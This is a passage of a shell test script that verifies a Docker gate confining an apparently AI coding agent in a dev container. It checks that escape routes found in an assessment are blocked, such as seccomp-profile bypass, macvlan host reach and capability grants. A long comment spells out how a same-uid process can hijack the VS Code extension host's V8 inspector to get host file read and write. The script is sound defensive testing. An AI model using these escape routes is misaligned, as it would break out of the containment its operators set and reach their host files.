if docker inspect "$colon_name" >/dev/null 2>&1; then
  echo "  FAIL (allowed!): colon-separated custom seccomp profile bypassed the shim"; fail=$((fail+1))
  docker rm -f "$colon_name" >/dev/null 2>&1
else
  echo "  ok  (blocked):   colon-separated custom seccomp profile"; pass=$((pass+1))
fi

# F7: prune is daemon-GLOBAL -- one call wipes every project's stopped containers / unused
# volumes / dangling images / unused networks. Now denied outright.
expect_deny "docker container prune (daemon-global)" docker container prune -f
expect_deny "docker volume prune (daemon-global)"    docker volume prune -f
expect_deny "docker image prune (daemon-global)"     docker image prune -f
expect_deny "docker network prune (daemon-global)"   docker network prune -f

# F8: `docker save` uses the PLURAL /images/get?names=..., which the singular /images/{id}/get
# matcher missed -- it streamed foreign image layers. Ensure an image is present (pull is
# allowed) so the deny isn't a false pass on "no such image".
docker pull -q alpine >/dev/null 2>&1 || true
expect_deny "docker save (plural /images/get)" docker save alpine -o /dev/null

# F10: a macvlan/ipvlan network or one pinning a host `parent` interface gives L2 reach the
# dev container itself lacks. Denied; a plain user bridge stays allowed.
expect_deny "create a macvlan network (host parent reach)" docker network create -d macvlan --subnet 10.222.0.0/24 -o parent=eth0 escape_macvlan_$$
expect_allow "create a plain user bridge network" docker network create escape_bridge_$$
docker network rm "escape_bridge_$$" >/dev/null 2>&1 || true

# F2: every created sibling is force-dropped to CapDrop:["ALL"] and re-granted only the bounded
# SIBLING_CAPS allowlist (clamped to Docker's defaults in the shim). Create a sibling and inspect
# its caps. (Asserts the shipped default -- force-on with the mostly-safe set; if you set
# SIBLING_CAPS=default this section is expected to report CapDrop not forced.)
echo "== sibling capability allowlist (F2: CapDrop ALL + bounded CapAdd) =="
capc=$(docker create alpine true 2>/dev/null)
if [ -n "$capc" ]; then
  cd_=$(docker inspect --format '{{json .HostConfig.CapDrop}}' "$capc" 2>/dev/null)
  ca_=$(docker inspect --format '{{json .HostConfig.CapAdd}}' "$capc" 2>/dev/null)
  case "$cd_" in
    *ALL*) echo "  ok  (forced):    CapDrop=ALL on a created sibling ($cd_)"; pass=$((pass+1));;
    *)     echo "  FAIL (open!):    CapDrop is not ALL ($cd_)"; fail=$((fail+1));;
  esac
  case "$ca_" in
    *SYS_ADMIN*|*NET_ADMIN*|*SYS_PTRACE*|*'"ALL"'*)
           echo "  FAIL (open!):    a dangerous/over-broad cap is in CapAdd ($ca_)"; fail=$((fail+1));;
    *)     echo "  ok  (bounded):   CapAdd is within the mostly-safe allowlist ($ca_)"; pass=$((pass+1));;
  esac
  docker rm -f "$capc" >/dev/null 2>&1
else
  echo "  ??  could not create a probe container to check the cap policy"
fi

# VS Code extension-host V8-inspector hijack (assessment finding F1). This is NOT a Docker-gate
# bug -- it bypasses the gate entirely. The dev container's agent runs as the SAME uid as the VS
# Code extension-host node process (`... bootstrap-fork --type=extensionHost`). ptrace_scope
# blocks ptrace of a non-child, but signals are NOT ptrace: a same-uid process can `kill -USR1`
# the extension host to open its in-process V8 inspector on 127.0.0.1:9229, attach over CDP
# (= arbitrary JS inside the extension host), and call `vscode.workspace.fs` over `vscode-local://`
# for arbitrary HOST read+write (and cross-container reads). No in-container Docker control can
# revoke this; the fix is to run the agent as a DIFFERENT, lower-privileged uid than the VS Code
# server / extension host -- then SIGUSR1 -> EPERM and the inspector never opens.
#   IMPORTANT: NODE_OPTIONS / --inspect=false does NOT close this (SIGUSR1 re-enables the
#   inspector), so this test will still (correctly) FAIL under that partial mitigation. Only uid
#   separation flips it to PASS.
#   Verdict: ok/PASS (gap closed) when the agent CANNOT signal the extension host (EPERM, the
#   uid-separation fix); FAIL (gap open) when it can -- we then corroborate by opening the
#   inspector and confirming a live CDP debug target is reachable. "??" (no pass/fail) if no
#   extension host is running (e.g. run outside an attached VS Code session) so a missing editor
#   never silently "passes".
#   SIDE EFFECT, only when the gap is OPEN: sending SIGUSR1 opens the inspector on the live
#   extension host. Reload the VS Code window / restart the extension host to close it. When the
#   gap is CLOSED the signal is denied, so the test has no side effect.
echo "== VS Code extension-host inspector hijack (F1: host FS read/write -- must be BLOCKED) =="
eh_pids=$(pgrep -f 'bootstrap-fork.*--type=extensionHost' 2>/dev/null)
[ -z "$eh_pids" ] && eh_pids=$(ps -eo pid,args 2>/dev/null | grep -F 'bootstrap-fork' | grep -F 'extensionHost' | grep -v grep | awk '{print $1}')
if [ -z "$eh_pids" ]; then
  echo "  ??  no VS Code extension host found (run inside an attached dev container); F1 not tested"
else
  me=$(id -u); signalable=""
  for pid in $eh_pids; do
    ehuid=$(stat -c %u "/proc/$pid" 2>/dev/null)
    # `kill -0` succeeds iff we may signal it (same uid; the agent is not root) -- exactly the
    # capability SIGUSR1 needs, and exactly what running the agent as a separate uid removes.
    if kill -0 "$pid" 2>/dev/null; then
      echo "  note: extension host pid=$pid uid=$ehuid, our uid=$me -> signalable (same uid)"
      signalable="$pid"; break
    else
      echo "  note: extension host pid=$pid uid=$ehuid, our uid=$me -> EPERM (cannot signal)"
    fi
  done
  if [ -z "$signalable" ]; then
    echo "  ok  (blocked):   cannot signal the extension host (uid-separated) -- inspector hijack unavailable"; pass=$((pass+1))
  else
    # Gap is open. Corroborate the first exploit stage: open the inspector and confirm a live CDP
    # debug target appears (a reachable target == full debugger == arbitrary code execution in the
    # extension host, which holds the vscode.workspace.fs host read/write API). We stop at CDP
    # *discovery* (a plain GET /json) -- we do NOT drive the debugger or touch any host file.
    kill -USR1 "$signalable" 2>/dev/null
    target=""
    for _ in 1 2 3 4 5 6; do
      if command -v curl >/dev/null 2>&1; then
        out=$(curl -s --max-time 2 http://127.0.0.1:9229/json 2>/dev/null)
      else
        out=$(python3 -c 'import urllib.request,sys
try: sys.stdout.write(urllib.request.urlopen("http://127.0.0.1:9229/json",timeout=2).read().decode())
except Exception: pass' 2>/dev/null)
      fi
      case "$out" in *webSocketDebuggerUrl*) target="yes"; break;; esac
      sleep 0.5
    done
    if [ -n "$target" ]; then
      echo "  FAIL (open!):    SIGUSR1 opened a live CDP debug target on 127.0.0.1:9229 -- arbitrary code exec in the extension host => host FS read/write via vscode-local://"; fail=$((fail+1))
      echo "  note: the inspector is now OPEN on the live extension host -- reload the VS Code window / restart the extension host to close it"
    else
      # Even if the inspector probe raced/missed, the enabling condition (same-uid signal
      # delivery to the extension host) is present, so the hijack primitive is available.
      echo "  FAIL (open!):    can deliver SIGUSR1 to the extension host (same uid) -- inspector-hijack primitive is available"; fail=$((fail+1))
    fi
  fi
fi

echo
echo "passed: $pass   failed: $fail"
if [ "$fail" -eq 0 ]; then echo "All good - the gate held."; else echo "Some checks FAILED - review above."; fi
